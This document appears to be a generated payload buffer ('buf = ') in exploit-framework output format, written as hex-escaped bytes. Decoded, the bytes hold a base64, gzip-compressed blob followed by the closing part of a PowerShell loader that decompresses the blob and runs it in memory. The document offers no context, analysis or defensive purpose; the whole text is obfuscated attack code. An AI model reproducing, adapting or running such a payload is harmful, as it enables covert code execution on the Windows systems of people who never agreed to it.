buf = 
"\x75\x47\x41\x70\x34\x43\x78\x64\x30\x68\x66\x43\x56\x69" +
"\x6d\x54\x62\x61\x6d\x6e\x4c\x57\x4b\x57\x63\x77\x52\x64" +
"\x55\x2f\x67\x31\x4f\x34\x79\x78\x46\x70\x71\x44\x31\x30" +
"\x41\x4c\x39\x4f\x4f\x73\x59\x7a\x75\x45\x62\x72\x76\x33" +
"\x76\x30\x33\x38\x78\x56\x75\x43\x50\x74\x6b\x76\x38\x52" +
"\x68\x65\x6f\x46\x78\x58\x52\x39\x6d\x46\x68\x58\x78\x6d" +
"\x54\x76\x79\x56\x65\x34\x49\x7a\x6d\x6d\x51\x6f\x46\x4a" +
"\x6e\x6f\x6e\x70\x5a\x6e\x55\x45\x49\x34\x53\x4f\x65\x36" +
"\x74\x68\x6f\x4a\x76\x74\x75\x53\x4a\x68\x56\x35\x76\x72" +
"\x46\x53\x32\x72\x56\x31\x4e\x63\x56\x6b\x64\x72\x66\x55" +
"\x41\x78\x66\x36\x51\x43\x72\x70\x77\x79\x2f\x2f\x6a\x53" +
"\x49\x6d\x55\x33\x55\x32\x63\x6b\x43\x38\x57\x6c\x43\x58" +
"\x64\x77\x39\x56\x49\x5a\x6a\x46\x6e\x54\x78\x59\x76\x2b" +
"\x4a\x70\x6c\x6e\x43\x62\x46\x71\x6d\x63\x78\x42\x59\x39" +
"\x52\x53\x72\x41\x43\x4c\x48\x69\x53\x5a\x32\x67\x49\x66" +
"\x6e\x51\x39\x4b\x45\x33\x53\x47\x62\x68\x56\x47\x50\x44" +
"\x78\x4a\x37\x53\x6e\x4b\x55\x76\x61\x58\x72\x46\x5a\x2b" +
"\x68\x57\x2b\x57\x53\x71\x31\x2f\x46\x72\x79\x63\x78\x31" +
"\x79\x71\x2f\x38\x76\x69\x46\x45\x74\x34\x76\x45\x39\x4b" +
"\x6b\x6c\x47\x38\x66\x4c\x61\x57\x6b\x78\x4f\x67\x32\x4d" +
"\x33\x49\x68\x55\x56\x79\x6b\x53\x31\x63\x59\x74\x64\x6d" +
"\x36\x44\x7a\x68\x74\x30\x67\x6a\x6e\x47\x70\x4e\x46\x79" +
"\x5a\x44\x4c\x63\x6b\x73\x6e\x75\x4a\x72\x4d\x41\x56\x43" +
"\x6f\x6e\x48\x66\x50\x66\x51\x6a\x59\x51\x2f\x78\x7a\x73" +
"\x63\x32\x6b\x44\x74\x33\x70\x39\x39\x30\x6e\x74\x2f\x53" +
"\x6e\x71\x6b\x31\x33\x76\x58\x37\x70\x34\x47\x4e\x6e\x53" +
"\x72\x46\x45\x38\x71\x67\x58\x52\x68\x75\x4a\x62\x51\x52" +
"\x42\x64\x5a\x56\x4b\x78\x70\x6a\x6a\x57\x37\x4d\x6a\x63" +
"\x6c\x4f\x56\x4d\x6e\x62\x5a\x75\x4b\x42\x6a\x55\x70\x73" +
"\x36\x67\x43\x65\x34\x45\x64\x78\x72\x6d\x75\x39\x79\x32" +
"\x4a\x4b\x6c\x50\x58\x78\x75\x38\x36\x4d\x31\x31\x51\x32" +
"\x48\x55\x66\x6e\x4a\x46\x47\x33\x34\x46\x50\x4a\x59\x77" +
"\x50\x66\x48\x37\x67\x67\x69\x73\x4d\x55\x61\x68\x30\x6c" +
"\x73\x5a\x55\x34\x54\x38\x30\x53\x78\x4e\x71\x71\x69\x36" +
"\x6b\x57\x54\x61\x6c\x38\x66\x33\x45\x38\x35\x36\x68\x51" +
"\x77\x61\x35\x6d\x70\x75\x53\x4e\x55\x34\x44\x2b\x62\x77" +
"\x75\x58\x69\x4e\x39\x74\x53\x54\x31\x6b\x5a\x71\x61\x6a" +
"\x61\x64\x62\x68\x65\x50\x4a\x78\x44\x47\x2f\x70\x75\x77" +
"\x43\x51\x76\x71\x42\x66\x68\x37\x2f\x65\x41\x68\x32\x56" +
"\x6c\x5a\x6b\x53\x62\x58\x74\x6a\x68\x56\x75\x46\x45\x45" +
"\x57\x38\x38\x54\x55\x39\x4e\x6e\x5a\x49\x41\x71\x76\x72" +
"\x6a\x77\x6a\x39\x53\x64\x6a\x34\x37\x5a\x76\x64\x48\x48" +
"\x79\x74\x53\x77\x6e\x51\x7a\x54\x48\x4c\x41\x4f\x52\x4d" +
"\x36\x61\x74\x51\x51\x75\x52\x53\x31\x32\x67\x62\x54\x67" +
"\x42\x42\x39\x6e\x71\x7a\x4c\x77\x78\x30\x39\x34\x6e\x65" +
"\x6b\x33\x6e\x5a\x4c\x38\x52\x38\x38\x55\x79\x56\x2f\x58" +
"\x6d\x4c\x51\x76\x35\x63\x69\x76\x53\x75\x37\x6b\x43\x4e" +
"\x2f\x53\x67\x48\x2f\x54\x65\x77\x56\x39\x70\x4c\x4c\x6a" +
"\x6b\x4d\x77\x55\x68\x46\x30\x73\x75\x43\x67\x45\x4a\x44" +
"\x45\x78\x45\x59\x79\x6c\x42\x6f\x41\x36\x77\x77\x6f\x54" +
"\x63\x73\x6c\x74\x6d\x4b\x39\x42\x71\x51\x73\x79\x34\x51" +
"\x72\x63\x2b\x58\x54\x66\x6f\x31\x69\x2f\x6b\x47\x74\x6d" +
"\x64\x6d\x6a\x66\x4c\x70\x75\x72\x65\x5a\x75\x45\x63\x31" +
"\x63\x33\x72\x70\x42\x71\x66\x54\x4f\x42\x61\x51\x78\x70" +
"\x74\x62\x4f\x65\x54\x50\x63\x2f\x58\x63\x36\x32\x38\x50" +
"\x6e\x4e\x78\x53\x65\x4f\x35\x35\x6c\x79\x43\x51\x73\x72" +
"\x32\x6b\x36\x57\x32\x71\x6d\x6d\x62\x78\x7a\x30\x59\x79" +
"\x42\x36\x70\x54\x6c\x76\x4f\x72\x67\x72\x4a\x65\x37\x78" +
"\x69\x4b\x33\x36\x50\x2f\x75\x56\x6d\x71\x62\x57\x56\x57" +
"\x75\x38\x39\x79\x75\x36\x77\x46\x31\x2b\x6c\x52\x47\x63" +
"\x59\x51\x55\x66\x6e\x75\x57\x42\x78\x7a\x65\x4d\x69\x6b" +
"\x78\x34\x5a\x55\x6a\x58\x58\x71\x35\x30\x50\x6e\x64\x39" +
"\x4f\x33\x58\x71\x65\x5a\x75\x69\x36\x54\x6c\x72\x30\x51" +
"\x4f\x6e\x2b\x41\x32\x6e\x69\x6c\x68\x58\x66\x68\x61\x41" +
"\x4c\x7a\x6f\x47\x66\x42\x7a\x35\x44\x43\x49\x35\x79\x65" +
"\x32\x6e\x6f\x59\x7a\x4c\x53\x52\x33\x6e\x70\x6b\x72\x4c" +
"\x7a\x77\x5a\x69\x51\x34\x6f\x69\x58\x39\x73\x67\x31\x69" +
"\x75\x35\x79\x61\x71\x67\x30\x30\x4f\x79\x59\x4b\x6d\x53" +
"\x75\x6a\x67\x4e\x4f\x36\x6a\x30\x70\x4b\x7a\x30\x55\x6a" +
"\x4a\x5a\x48\x43\x51\x43\x2f\x47\x72\x63\x6c\x65\x50\x2f" +
"\x44\x32\x78\x34\x38\x77\x76\x64\x63\x2b\x53\x55\x71\x57" +
"\x43\x6b\x4f\x6f\x50\x70\x51\x43\x46\x49\x42\x61\x35\x46" +
"\x2f\x6b\x51\x4c\x6f\x31\x43\x41\x62\x51\x38\x52\x42\x49" +
"\x62\x67\x59\x42\x35\x4f\x44\x59\x41\x33\x57\x78\x54\x36" +
"\x4a\x4d\x36\x54\x43\x39\x5a\x35\x6a\x63\x4e\x35\x38\x30" +
"\x59\x32\x2f\x61\x52\x31\x33\x30\x76\x38\x71\x6e\x78\x72" +
"\x6d\x6c\x36\x33\x54\x4c\x4a\x57\x6a\x78\x71\x6c\x38\x50" +
"\x6d\x65\x35\x6e\x4f\x2f\x76\x58\x7a\x73\x47\x37\x5a\x30" +
"\x53\x5a\x6c\x79\x69\x50\x55\x39\x39\x4a\x30\x61\x4b\x4c" +
"\x36\x75\x4c\x55\x48\x39\x44\x74\x50\x62\x66\x44\x76\x76" +
"\x6b\x32\x47\x73\x51\x66\x48\x76\x39\x6d\x41\x48\x79\x48" +
"\x78\x33\x67\x68\x66\x4d\x2f\x43\x51\x41\x41\x27\x29\x29" +
"\x29\x2c\x5b\x53\x79\x73\x74\x65\x6d\x2e\x49\x4f\x2e\x43" +
"\x6f\x6d\x70\x72\x65\x73\x73\x69\x6f\x6e\x2e\x43\x6f\x6d" +
"\x70\x72\x65\x73\x73\x69\x6f\x6e\x4d\x6f\x64\x65\x5d\x3a" +
"\x3a\x44\x65\x63\x6f\x6d\x70\x72\x65\x73\x73\x29\x29\x29" +
"\x2e\x52\x65\x61\x64\x54\x6f\x45\x6e\x64\x28\x29\x29\x29" +
"\x22"
